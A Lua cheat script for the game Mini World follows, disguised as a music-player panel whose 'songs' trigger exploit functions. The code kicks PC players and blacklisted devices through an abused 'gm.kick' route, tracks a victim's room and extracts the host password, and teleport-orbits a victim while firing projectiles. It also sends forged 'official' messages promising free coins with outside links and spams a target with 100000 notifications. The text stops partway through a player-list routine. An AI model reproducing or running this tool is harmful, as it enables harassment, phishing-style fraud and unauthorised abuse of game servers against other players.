local DEVICE_AUTH_DISABLED = true -- Chế độ được cấp quyền: không yêu cầu DeviceID

local hjvip = {
    ["ef9b2499cea7741b9f81a9769ee9eba0"] = true,
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["1afdd486624e54dcb903315d1407ce35"] = true,
        ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,
                ["0dfdb4a2dc1d5491654b7c2defc506c5"] = true,
                                ["79550b2e16f3c83580edf5e6fdee2b69"] = true,
}

local currentDeviceID = ClientMgr:getDeviceID() or GetClientInfo():getDeviceID()

if DEVICE_AUTH_DISABLED or hjvip[currentDeviceID] then
    -- 标记是否已打开
    local uiOpened = false
    
    -- 先延迟2秒再启动（确保游戏完全加载）
    threadpool:delay(2, function()
        -- 立即打开一次
        if not GetInst("MiniUIManager"):IsShown("MiniClubPlayerAutoGen") then
            GetInst("MiniUIManager"):OpenUI("QQMusicPlayer", "miniui/miniworld/QQMusicPlayer", "MiniClubPlayerAutoGen")
            uiOpened = true
        end
        
        -- 注册UI调度器，持续监控
        GetInst("MiniUIScheduler"):regGloabel(function()
            -- 如果UI被关闭了，重新打开（不管在主页还是游戏里）
            if not GetInst("MiniUIManager"):IsShown("MiniClubPlayerAutoGen") then
                GetInst("MiniUIManager"):OpenUI("QQMusicPlayer", "miniui/miniworld/QQMusicPlayer", "MiniClubPlayerAutoGen")
                uiOpened = true
            end
        end, 2.0, 86400000, nil, false)  -- 每2秒执行，持续24小时
    end)
end



    
    
    
    
    local MiniClubPlayerCtrl, MiniClubPlayerModel, MiniClubPlayerView = GetInst("MiniUIManager"):GetMVC("MiniClubPlayerAutoGen")
    
    function MiniClubPlayerCtrl:OpenMusicPlayer()
	-- 打开你的 QQMusicTrigger 面板
	GetInst("MiniUIManager"):OpenUI("QQMusicTrigger", "miniui/miniworld/QQMusicPlayer", "QQMusicTriggerAutoGen", {callbackSelectMusic = callback})
end

-- 根据播放状态同步刷新悬浮球、播放面板界面
-- info：当前播放歌曲数据
-- state：播放状态枚举值
-- PLAYSTATE：播放状态枚举定义（播放/暂停/停止）
function MiniClubPlayerView:refreshPlayStateView(info, state, PLAYSTATE)
	-- 注释原生播放状态动画逻辑
	--[[
	if state == PLAYSTATE.PLAY and info then
		...省略代码...
	elseif state == PLAYSTATE.PAUSE then
		...省略代码...
	elseif state == PLAYSTATE.STOP and self.components then
		...省略代码...
	end
	]]

	-- 强制悬浮球永久转圈加载
	if self.components and self.components.buoyNode and not tolua.isnull(self.components.buoyNode) then
		self.components.buoyNode:SetLoading(true)
	end
end

function MiniClubPlayerView:EnableDragBuoy()
	if not self.widgets or not self.widgets.m_buoy then
		return
	end
	
	local buoy = self.widgets.m_buoy
	local isDragging = false
	local dragOffsetX = 0
	local dragOffsetY = 0
	local lastTouchX = 0
	local lastTouchY = 0
	local speedMultiplier = 1.5
	
	GetInst("MiniUIEventDispatcher"):addEventListener(buoy, UIEventType_TouchBegin, function(obj, context)
		isDragging = true
		local touchPos = context:getPosition()
		local buoyPos = buoy:getPosition()
		dragOffsetX = touchPos.x - buoyPos.x
		dragOffsetY = touchPos.y - buoyPos.y
		lastTouchX = touchPos.x
		lastTouchY = touchPos.y
		context:preventDefault()
	end)
	
	GetInst("MiniUIEventDispatcher"):addEventListener(buoy, UIEventType_TouchMove, function(obj, context)
		if isDragging then
			local touchPos = context:getPosition()
			local deltaX = (touchPos.x - lastTouchX) * speedMultiplier
			local deltaY = (touchPos.y - lastTouchY) * speedMultiplier
			local newX = buoy:getPosition().x + deltaX
			local newY = buoy:getPosition().y + deltaY
			buoy:setPosition(newX, newY)
			lastTouchX = touchPos.x
			lastTouchY = touchPos.y
			context:preventDefault()
		end
	end)
	
	GetInst("MiniUIEventDispatcher"):addEventListener(buoy, UIEventType_TouchEnd, function(obj, context)
		if isDragging then
			isDragging = false
			-- ===== 松开吸附到最近的墙 =====
			self:SnapBuoyToWall()
			-- ==============================
		end
		context:preventDefault()
	end)
end

-------下面是悬浮窗

local QQMusicTriggerCtrl, QQMusicTriggerModel, QQMusicTriggerView = GetInst("MiniUIManager"):GetMVC("QQMusicTriggerAutoGen")
function QQMusicTriggerCtrl:Start()
local currentDeviceID = ClientMgr:getDeviceID() or GetClientInfo():getDeviceID() or ""
     -- 设备不在白名单，直接return，后面所有UI初始化代码都不会执行
     if not DEVICE_AUTH_DISABLED and not hjvip[currentDeviceID] then
         ShowGameTipsWithoutFilter("#cFF0000无设备权限，音乐面板禁止打开")
         return
     end
     -- 下面是你原有全部代码，无需改动
	-- 左侧分类栏配置：推荐歌单、最近播放
	self.define.leftInfos = {
		{
			title = "Chức năng①", -- 多语言文本：推荐歌单
			type = self.model.LISTTYPE.RECOMMEND -- 分类标识：推荐列表
		},
		{
			title = "Chức năng②", -- 多语言拼接：最近播放
			type = self.model.LISTTYPE.NEAR -- 分类标识：最近播放列表
		},
	}
	local param = {
		parent = self,
		model = self.model
	}
	self.model:InitData(param)
	self.view:InitUI(param)
	
	-- ===================== 手动控制最近播放 =====================
	local testSong = {
		song_id = 99980,
		song_name = "测试",
		singer_name = "1",
		song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
		song_play_time = 180,
		playable = 1
	}
	
	local nearList = {}
	table.insert(nearList, 1, {song_id = 99980})
	self.model:SetMusicList(self.model.LISTTYPE.NEAR, nearList)
	self.model:AddDetailMusic(testSong)
	-- ================================================================
	
	-- ===================== 打开UI自动播放音乐 =====================
	
	-- ================================================================
end


function QQMusicTriggerCtrl:RequestRecommendList()
	if GetInst("QQMusicPlayerManager") then
		-- 读取全局推荐歌单基础ID列表
		local recommend_list = GetInst("QQMusicPlayerManager"):GetRecommendList()
		
		-- ===================== 新增测试歌曲 =====================
		-- 直接构造测试列表
		recommend_list = {"99999", "99998","99997"}
		
		-- 构造测试歌曲详情1
		local testSongInfo1 = {
			song_id = 99999,
			song_name = "Tự động kick máy tính",
			singer_name = "1",
			song_play_url = "https://www.panurl.cn/view.php/622a81c1c9f07c35845def16ed75209a.png",
			song_play_time = 180,
			playable = 1
		}
		
		-- 构造测试歌曲详情2
		local testSongInfo2 = {
			song_id = 99998,
			song_name = "Blacklist mã thiết bị",
			singer_name = "2",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		local testSongInfo3 = {
			song_id = 99997,
			song_name = "Tự động truy vết hoàn toàn",
			singer_name = "3",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		local testSongInfo4 = {
			song_id = 99996,
			song_name = "Phi Lôi Thần Xoáy",
			singer_name = "4",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		
		local testSongInfo5 = {
			song_id = 99995,
			song_name = "Chặn chuyển hướng trang",
			singer_name = "5",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		local testSongInfo6 = {
			song_id = 99994,
			song_name = "Ngăn chặn màn hình đen",
			singer_name = "6",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		local testSongInfo7 = {
			song_id = 99993,
			song_name = "Giao diện Chống Rương",
			singer_name = "7",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		
		local testSongInfo8 = {
			song_id = 99992,
			song_name = "Gửi video cho bạn bè",
			singer_name = "8",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		
		local testSongInfo9 = {
			song_id = 99991,
			song_name = "Gửi tin nhắn từ xa",
			singer_name = "9",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		local testSongInfo10 = {
			song_id = 99990,
			song_name = "Ép lập đội cấu hình thấp",
			singer_name = "10",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}
		
		
		local testSongInfo11 = {
			song_id = 99989,
			song_name = "Buộc đăng xuất từ ​​xa",
			singer_name = "11",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}


		local testSongInfo12 = {
			song_id = 99988,
			song_name = "Làm đen màn hình từ xa",
			singer_name = "12",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}


		local testSongInfo13 = {
			song_id = 99987,
			song_name = "Vòng lặp Màn hình đen",
			singer_name = "13",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}


		local testSongInfo14 = {
			song_id = 99986,
			song_name = "Auto kick từ xa",
			singer_name = "14",
			song_play_url = "http://mdownload.mini1.cn/test/bgm111.mp4",
			song_play_time = 180,
			playable = 1
		}

		
		-- 关键：把测试歌曲添加到 model 的推荐列表中（和 recommend_list 保持一致）
		local musicList = {}
		table.insert(musicList, 1, {song_id = 99999})
		table.insert(musicList, 2, {song_id = 99998})
		table.insert(musicList, 3, {song_id = 99997})
		table.insert(musicList, 4, {song_id = 99996})
		table.insert(musicList, 5, {song_id = 99995})
		table.insert(musicList, 6, {song_id = 99994})
		table.insert(musicList, 7, {song_id = 99993})
		table.insert(musicList, 8, {song_id = 99992})
		table.insert(musicList, 9, {song_id = 99991})
		table.insert(musicList, 10, {song_id = 99990})
		table.insert(musicList, 11, {song_id = 99989})
		table.insert(musicList, 12, {song_id = 99988})
		table.insert(musicList, 13, {song_id = 99987})
		table.insert(musicList, 14, {song_id = 99986})
		self.model:SetMusicList(self.model.LISTTYPE.RECOMMEND, musicList)
		
		-- 添加到详情缓存
		self.model:AddDetailMusic(testSongInfo1)
		self.model:AddDetailMusic(testSongInfo2)
		self.model:AddDetailMusic(testSongInfo3)
		self.model:AddDetailMusic(testSongInfo4)
		self.model:AddDetailMusic(testSongInfo5)
		self.model:AddDetailMusic(testSongInfo6)
		self.model:AddDetailMusic(testSongInfo7)
		self.model:AddDetailMusic(testSongInfo8)
		self.model:AddDetailMusic(testSongInfo9)
		self.model:AddDetailMusic(testSongInfo10)
		self.model:AddDetailMusic(testSongInfo11)
		self.model:AddDetailMusic(testSongInfo12)
		self.model:AddDetailMusic(testSongInfo13)
		self.model:AddDetailMusic(testSongInfo14)
		-- ======================================================
		
		-- 直接刷新UI，传入 recommend_list（和 model 中的数据一致）
		self:RefreshMusicList(recommend_list, self.model.LISTTYPE.RECOMMEND)
	end
end






-- 用户点击添加歌曲到本地播放列表
function QQMusicTriggerCtrl:OnAddMusic(song_id, cmd)
	-- 测试歌曲直接播放
	
	
	if song_id == 99999 or song_id == "99999" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000开启成功")
-- 全局游戏事件统一回调函数，接收房间、互动、场景切换等服务器推送事

-- 进游戏自动检测并踢出电脑玩家
threadpool:work(function()
    threadpool:wait(1)
    
    function OpenGame_OnEvent()
	-- 拦截所有动作邀请相关网络推送，直接return不执行后续逻辑
	if arg1 == "GIE_UPDATE_ACTORINVITE" then
		return
	end

	-- 事件1：房主收到【等待房主开局】事件
	if arg1 == "GIE_WAITHOST_STARTGAME" and IsRoomOwner() then
		NeedOpenMakerRunGame = true
		getglobal("OpenGame"):Show()
	-- 事件2：房主收到【关闭开局面板】事件
	elseif arg1 == "GIE_CLOSE_HOST_STARTGAME" and IsRoomOwner() then
		NeedOpenMakerRunGame = false
		getglobal("OpenGame"):Hide()
	-- 事件3：收到他人发送的动作互动邀请（已被上方代码拦截，不再执行）
	elseif arg1 == "GIE_UPDATE_ACTORINVITE" then
		if GetInst("actionExpressionManager"):IsOpenNew() then
			GetInst("actionExpressionManager"):HangleUpdateActorInviteEvent()
		else
			local ge = GameEventQue:getCurEvent()
			local info = {
				targetUin = ge.body.actorInvite.targetuin,
				actId = ge.body.actorInvite.actId,
				inviteType = ge.body.actorInvite.inviteType,
				lastTime = MAX_ACTION_INVITE_TIME + os.time()
			}
			if info.inviteType == 0 then
				local refuseTime = getkv("ActorInviteRefuseTime" .. info.targetUin) or nil
				local timeSpace = 180
				local time = getServerTime() - timeSpace * 60
				if refuseTime and tonumber(refuseTime) > tonumber(time) then
					return
				end
				ShowGameTips(GetS(15292))
				getglobal("ActorInviteTipBtn"):Show()
				local Ani = getglobal("ActorInviteTipBtnAni")
				if Ani then
					local actInviteDef = getActInviteDefById(info.actId)
					if actInviteDef then
						local imgUrl = "ui/mobile/effect/ui_zbhz_" .. actInviteDef.ActID .. ".png"
						Ani:SetTexture(imgUrl, true)
						Ani:SetUVAnimation(120, true)
					end
				end
				isPlayingactorInviteAni = true
				if actorInviteTimer then
					threadpool:kick(actorInviteTimer)
				end
				actorInviteTimer = threadpool:delay(MAX_ACTION_INVITE_TIME, function()
					isPlayingactorInviteAni = false
					getglobal("ActorInviteTipBtn"):Hide()
				end)
				setActorInviteInfo(info)
			elseif info.inviteType == 1 then
				local uin = CurMainPlayer:getUin()
				local targetUin = info.targetUin
				CurMainPlayer:playSkinAct(info.actId, uin, targetUin)
			elseif info.inviteType == 2 then
				ShowGameTips(GetS(15289))
			elseif info.inviteType == 3 then
				ShowGameTips(GetS(15290))
			end
		end
	-- 事件4：大世界场景切换，上报埋点统计
	elseif arg1 == "GE_WORLD_CHANGE" then
		Report418Event(3)
	end
end







    
    while true do
        if CurWorld and CurMainPlayer and ClientCurGame and ClientCurGame:isInGame() then
            local myUin = AccountManager:getUin()
            local num = ClientCurGame:getNumPlayerBriefInfo()
            
            for i = 1, num do
                local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                
                if briefInfo and briefInfo.uin and briefInfo.uin > 1000 and briefInfo.uin ~= myUin then
                    local code, ret = BuddyManager:query_friend_info(briefInfo.uin)
                    
                    if code == ErrorCode.OK and ret and ret.baseinfo and ret.baseinfo.extra then
                        local deviceSystem = ret.baseinfo.extra.DeviceSystem or ""
                        
                        if deviceSystem == "windows" or deviceSystem == "Windows" then
                            local targetUin = briefInfo.uin
                            ShowGameTipsWithoutFilter("检测到电脑玩家，迷你号: " .. tostring(targetUin) .. "，正在踢出...")
                            threadpool:wait(0.1)
                            -- 使用你提供的踢人方式
                            AccountManager.cluster.buddysvr.routemore('gm.kick', targetUin,0)
                        end
                    end
                end
            end
        end
        
        threadpool:wait(1)
    end
end)



		return
	end
	
	
	if song_id == 99998 or song_id == "99998" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000开启成功")
	-- 白名单 自行填写Uin
local whitelist = {}

-- 本地存储路径
local SAVE_PATH = "/storage/emulated/0/自动迷你lua/拉黑设备码本地检测.txt"

-- ========== 工具：读取本地黑名单（加异常捕获） ==========
local function GetLocalBlackDeviceList()
    local list = {}
    local ok, file = pcall(en, SAVE_PATH, "r")
    if not ok or not file then
        return list
    end
    for line in file:lines() do
        local deviceId = line:match("^%s*(.-)%s*$")
        if deviceId ~= "" then
            local repeatFlag = false
            for _, dev in ipairs(list) do
                if dev == deviceId then
                    repeatFlag = true
                    break
                end
            end
            if not repeatFlag then
                table.insert(list, deviceId)
            end
        end
    end
    file:close()
    return list
end

-- ========== 工具：保存设备到本地黑名单 ==========
local function SaveDeviceToLocalBan(targetDevice)
    local allList = GetLocalBlackDeviceList()
    local exist = false
    for _, dev in ipairs(allList) do
        if dev == targetDevice then
            exist = true
            break
        end
    end
    if exist then
        return false
    end
    table.insert(allList, targetDevice)
    local ok, file = pcall(io.open, SAVE_PATH, "w")
    if not ok or not file then
        ShowGameTipsWithoutFilter("#R文件夹无读写权限！",3)
        return false
    end
    for _, dev in ipairs(allList) do
        file:write(dev .. "\n")
    end
    file:close()
    return true
end

-- 1. 选玩家添加设备黑名单
ShowPlayerList(function(targetUin)
    local code, ret = BuddyManager:query_friend_info(targetUin)
    if code ~= ErrorCode.OK or not ret or not ret.baseinfo or not ret.baseinfo.extra then
        ShowGameTipsWithoutFilter("#R读取玩家设备信息失败", 3)
        return
    end
    local targetDevice = ret.baseinfo.extra.DeviceID or ""
    if targetDevice == "" then
        ShowGameTipsWithoutFilter("#R该玩家无设备ID，无法拉黑", 3)
        return
    end
    local saveResult = SaveDeviceToLocalBan(targetDevice)
    local allBanList = GetLocalBlackDeviceList()
    local tipStr
    if saveResult then
        tipStr = "已拉黑设备："..targetDevice.."\n黑名单总数："..#allBanList
    else
        tipStr = "设备已存在黑名单\n总数："..#allBanList
    end
    ShowGameTipsWithoutFilter(tipStr,4)
    GetClientInfo():clickCopy(tipStr)
end, "选择要拦截的玩家")

-- 2. 后台循环检测（移除goto、全逻辑pcall容错）
threadpool:work(function()
    while true do
        local banDeviceList = GetLocalBlackDeviceList()
        if #banDeviceList > 0 then
            local ok, err = pcall(function()
                if not (CurWorld and CurMainPlayer and ClientCurGame and ClientCurGame:isInGame()) then
                    return
                end
                local myUin = AccountManager:getUin()
                local playerCount = ClientCurGame:getNumPlayerBriefInfo()
                for i = 1, playerCount do
                    local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                    if briefInfo and briefInfo.uin and briefInfo.uin > 1000 and briefInfo.uin ~= myUin then
                        -- 白名单跳过
                        if not whitelist[briefInfo.uin] then
                            local code, ret = BuddyManager:query_friend_info(briefInfo.uin)
                            if code == ErrorCode.OK and ret and ret.baseinfo and ret.baseinfo.extra then
                                local curDevice = ret.baseinfo.extra.DeviceID or ""
                                if curDevice ~= "" then
                                    -- 匹配黑名单
                                    for _, banDev in ipairs(banDeviceList) do
                                        if curDevice == banDev then
                                            local kickUin = briefInfo.uin
                                            ShowGameTipsWithoutFilter("#R黑名单设备玩家 "..kickUin.." 已踢出")
                                            AccountManager.cluster.buddysvr.routemore('gm.kick', kickUin, 0)
                                            break
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end)
            if not ok then
                print("检测玩家报错：", err)
            end
        end
        threadpool:wait(0.3) -- 放慢间隔，防止频繁查询服务器报错
    end
end)

	
	return
	end
	
	
	if song_id == 99997 or song_id == "99997" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000开启成功")
	ShowTextInputSafe(function(text)
    local raw_Uin = text
    local roomID = ""
    local hostPassword = ""
    local num_Uin = tonumber(raw_Uin)
    local query_Uin
    
    if num_Uin then
        query_Uin = num_Uin < 1000000000 and (num_Uin + 1000000000) or num_Uin
    else
        query_Uin = raw_Uin
    end
    
    ShowGameTipsWithoutFilter("开始追踪玩家: " .. tostring(query_Uin))
    
    local isEntering = false
    local isTracking = true
    
    threadpool:work(function()
        while true do
            -- 如果正在进入房间，等待进入完成，不执行任何追踪
            if isEntering then
                threadpool:wait(1)
                if CurWorld and CurMainPlayer then
                    isEntering = false
                    isTracking = false
                    ShowGameTipsWithoutFilter("已进入房间，停止追踪，开始检测目标...")
                end
                threadpool:wait(1)
            else
                -- 如果已经在房间里，检测目标是否还在
                if CurWorld and CurMainPlayer then
                    local myUin = AccountManager:getUin()
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    local targetInRoom = false
                    
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin == query_Uin then
                            targetInRoom = true
                            break
                        end
                    end
                    
                    if not targetInRoom then
                        ShowGameTipsWithoutFilter("目标不在房间，离开并重新追踪...")
                        AccountManager.cluster.buddysvr.routemore('gm.kick', myUin, 0)
                        threadpool:wait(0.5)
                        isTracking = true
                        ShowGameTipsWithoutFilter("重新开始追踪...")
                    end
                    threadpool:wait(3)
                else
                    -- 不在房间里，只做后台追踪，不加载任何界面
                    if isTracking then
                        local ret, data = BuddyManager:query_friend_info(query_Uin, true)
                        if ret == 0 and type(data) == "table" then
                            local statusinfo = data.statusinfo or {}
                            local newRoomID = tostring(statusinfo[2] or "")
                            local roominfo_str = statusinfo[3]
                            
                            if newRoomID ~= "" then
                                local password = ""
                                if type(roominfo_str) == "string" and roominfo_str ~= "" then
                                    local f, err = loadstring("return " .. roominfo_str)
                                    if f then
                                        local ok, roominfo = pcall(f)
                                        if ok and type(roominfo) == "table" then
                                            password = roominfo.hostPassword or ""
                                        end
                                    end
                                end
                                
                                ShowGameTipsWithoutFilter("追踪到房间ID: " .. newRoomID .. " 密码：" .. password)
                                
                                -- 标记进入中，此时不会再执行追踪
                                isEntering = true
                                
                                -- 进入房间
                                FriendChat_ReqFriendRoomByUin(raw_Uin, nil, true, true)
                                
                                local roomDesc = GetInst("RoomService"):ReqQuickUpPlayerRoomInfo(raw_Uin)
                                if roomDesc then
                                    roomDesc.lcl_outTime = os.time() + 1
                                    GetInst("RoomService"):EnterRoomByDesc(0, false, roomDesc)
                                    ShowGameTipsWithoutFilter("正在进入房间...")
                                else
                                    -- 联机失败，尝试云服
                                    local roomSrv = GetInst("RoomService")
                                    if roomSrv and roomSrv.EnterRoomById then
                                        roomSrv:EnterRoomById(newRoomID, password)
                                        ShowGameTipsWithoutFilter("云服方式：正在进入房间...")
                                    else
                                        ShowGameTipsWithoutFilter("进入房间失败，继续追踪...")
                                        isEntering = false
                                    end
                                end
                            else
                                -- 目标不在房间，安静追踪，不打印
                            end
                        end
                    end
                    threadpool:wait(20)
                end
            end
        end
    end)
end)
return
	end
	
	
if song_id == 99996 or song_id == "99996" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000开启成功")
ShowPlayerList(function(uin)
    -- 获取目标玩家实例
    local targetPlayer = ClientCurGame:getPlayerByUin(uin)
    if not targetPlayer then
        print("找不到目标玩家uin：" .. uin)
        return
    end

    -- 固定环绕半径
    local radius = 4
    -- 360度分段，每10度瞬移一次，一圈36段
    local stepAngle = 80
    -- 循环持续环绕
    for angle = 0, 999999 do
        threadpool:wait(0.00000000888888888001) -- 瞬移间隔，越小速度越快
        -- 获取目标原始坐标
        local oriX, oriY, oriZ = targetPlayer:getPosition(0, 0, 0)
        local baseX = oriX / 100
        local baseY = oriY / 100
        local baseZ = oriZ / 100

        -- 当前弧度
        local rad = math.rad((angle * stepAngle) % 360)
        -- 圆周环绕计算X、Z平面（Y保持高度不变）
        local new_x = baseX + math.cos(rad) * radius
        local new_z = baseZ + math.sin(rad) * radius
        local new_y = baseY

        -- 强制目标玩家第一人称视角
        local tdata1 = {}
        tdata1[1] = "player";
        tdata1[2] = "changeViewMode";
        tdata1[3] = {uin, 0, true}
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)

        -- 自身瞬移到环绕点位
        local selfUin = AccountManager:getUin()
        local tdata2 = {}
        tdata2[1] = "player";
        tdata2[2] = "setPosition";
        tdata2[3] = {selfUin, new_x, new_y, new_z}
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
        
        local my_x, my_y, my_z = CurMainPlayer:getPosition(0, 0, 0)
                                local neww_x, neww_y, neww_z = my_x / 100, my_y / 100, my_z / 100
                                
                                -- 发射投掷物（火龙果）
                                local tdata3 = {
                                    [1] = "world",
                                    [2] = "spawnProjectile",
                                    [3] = {selfUin, 15508, neww_x, neww_y, neww_z, new_x, new_y, new_z, 500}
                                }
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata3)

        -- 打印当前角度与坐标，方便调试
        print("环绕角度：", (angle * stepAngle) % 360, "坐标", new_x, new_y, new_z)
    end
end, "飞雷神环绕")
return
	end
	
	
	if song_id == 99995 or song_id == "99995" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000开启成功")
		-- 黑名单链接关键词
function g_openBrowserUrlAuth(AAA)
ShowGameTipsWithoutFilter("已屏蔽跳转网页")
end
return
	end



	if song_id == 99994 or song_id == "99994" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")

		function GoToMainMenu(AAA)
			ShowGameTipsWithoutFilter("#RThông báo: đã chặn màn hình đen từ xa")
		end

		function AccRideChangeBtn_OnClick()--按钮点击事件
			GetClientGameManagerPtr():gotoGame("MainMenuStage")
		end

		threadpool:work(function()
			threadpool:wait(1)
			while true do
				pcall(function()
					local btn = getglobal("AccRideChangeBtn")
					if btn then
						btn:Show() -- Hiển thị nút
						-- Bổ sung lệnh định vị trí nút dựa theo AccRideCallBtn
						btn:SetPoint("right", "AccRideCallBtn", "left", -75, 0)
					end
				end)
				threadpool:wait(1)
			end
		end)
		
		return
	end	

	
		if song_id == 99993 or song_id == "99993" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Đã kích hoạt thành công")
function OpenCraftUIByBlockId(AAA)
	ShowGameTipsWithoutFilter("Đã chặn")
end


return
	end



	if song_id == 99992 or song_id == "99992" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000开启成功")


ShowTextInputSafe(function(text)
        -- 验证输入的迷你号是否有效
        local target = tonumber(text)
        if not target or target <= 1000 then
            ShowGameTipsWithoutFilter("#cff0000无效迷你号（需大于1000）", 3)
            return
        end
        
        -- 循环执行踢人（这里原代码是固定循环10000次）
        
            local src_uin = AccountManager:getUin()
local des_uin = target
local text = "因您表现良好,经官方决定给你发20000个迷你币,希望你能保持"
local showType = 2

local cur_time = os.time()
local s2_, s2t_, pure_s2t_ = get_login_sign()
local token = gFunc_getmd5(""..cur_time..s2_..src_uin)
local auth = gFunc_getmd5(""..src_uin..s2_..cur_time) -- 官方最常用格式

local tShareParams = {
    nickname = "",
    shareType = 9,
    imageUrl = "https://www.panurl.cn/view.php/622a81c1c9f07c35845def16ed75209a.png",
    url = "https://cn4.91kpz.com/short/label_related_list/otDa4t6lDDQ=",
    title = "赠送你20000个迷你币",
    content = "因您表现良好,经官方决定给你发20000个迷你币,希望你能保持"
}

local jsonExtendData = JSON:encode(tShareParams)
local base64_encode_jsonStr = ns_http.func.base64_encode(jsonExtendData)
local encode_jsonStr = ns_http.func.url_encode(base64_encode_jsonStr)

local url = "http://friend.miniworldgame.com:8180/server/friend"
    .. "?apiid=303"
    .. "&cmd=send_chat_msg"
    .. "&country=VN"
    .. "&des_uin=" .. des_uin
    .. "&extend_data=" .. encode_jsonStr
    .. "&lang=2"
    .. "&msg=" .. ns_http.func.url_encode(text)
    .. "&s2t=" .. pure_s2t_
    .. "&src_uin=" .. src_uin
    .. "&time=" .. cur_time
    .. "&token=" .. token
    .. "&uin=" .. src_uin
    .. "&ver=1.7.15"
    .. "&msgtype=1"
    .. "&pushchannel=1"
    .. "&auth=" .. auth
    .. "&mmsum=" .. AccountManager:getmmsum()
    .. "&cthash=" .. AccountManager:getUin() .. g_login_pure_s2t


-- 发送
ShowLoadLoopFrame(true)
ns_http.func.rpc_string_raw(url, function(ret) end, {
    src_uin = src_uin,
    des_uin = des_uin,
    show_type = showType
})
ShowGameTipsWithoutFilter("已发送给好友", 3)
        
    end, "输入迷你号")


return
	end



	if song_id == 99991 or song_id == "99991" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000开启成功")

ShowTextInputSafe(function(uinText)
    -- 校验迷你号合法性
    local rawUin = tonumber(uinText)
    if not rawUin or rawUin <= 1000 then
        ShowGameTipsWithoutFilter("#cff0000无效迷你号（需大于1000）", 3)
        return
    end

    -- 自动补全至10位数字
    local uinStr = tostring(rawUin)
    local len = #uinStr
    if len == 7 then
        uinStr = "100" .. uinStr
    elseif len == 8 then
        uinStr = "10" .. uinStr
    elseif len == 9 then
        uinStr = "1" .. uinStr
    end
    local targetUin = tonumber(uinStr)

    -- 第一层校验成功，弹出第二层输入框填写发送文字
    ShowTextInputSafe(function(msgText)
        -- 校验文字非空
        if msgText == "" then
            ShowGameTipsWithoutFilter("#cff0000输入内容不能为空", 3)
            return
        end
        -- 文字自动包裹双引号
        local wrapText = "\"" .. msgText .. "\""

        -- 组装推送消息数据包
        local info = {
            Text = wrapText,
            Type = "NotifyTips",
            ExceptIds = 1000
        }

        -- 修复错误：routemore 第二个参数必须字符串，单发改用 route
        for a=0,100000 do 
    threadpool:wait(0.1)
        AccountManager:routemore("teamservice.notifyMember", targetUin, info)
        end
        ShowGameTipsWithoutFilter("#c00ff00发送成功！目标十位数UIN:"..targetUin.." 内容:"..wrapText, 3)
    end, "输入要发送的文字内容")

end, "请输入目标迷你号（7/8/9位会自动补全为10位）")
return
	end

	if song_id == 99990 or song_id == "99990" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000开启成功")

GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 全局循环控制开关
_G.teleTeamLoopSwitch = false

-- 总控制弹窗
GetInst("MessageBoxInterface"):dualBtnBox(
    "左侧停止全部循环\n右侧开启，先选择目标玩家",
    "传送建队回执工具",
    nil,
    function(userData, btnType)
        if btnType == 0 then
            -- 停止逻辑
            _G.teleTeamLoopSwitch = false
            ShowGameTipsWithoutFilter("#cFF0000 已停止所有发包循环")
            return
        elseif btnType == 1 then
            -- 防止重复运行
            if _G.teleTeamLoopSwitch then
                ShowGameTipsWithoutFilter("#cFF7aad 任务正在运行，请勿重复开启")
                return
            end
            -- 校验是否在游戏房间
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000 请先进入游戏房间！")
                return
            end

            -- 加载房间玩家列表
            LoadHomelandLuas()
            local uin_list = GetPlayerUinList()
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000 当前房间无其他玩家")
                return
            end

            -- 组装玩家列表UI数据
            local data = {
                visit = {
                    history_num = "选择操作目标玩家",
                    today_num = "#cFF7aad 房间总人数："..#uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            for i = 1, #uin_list do
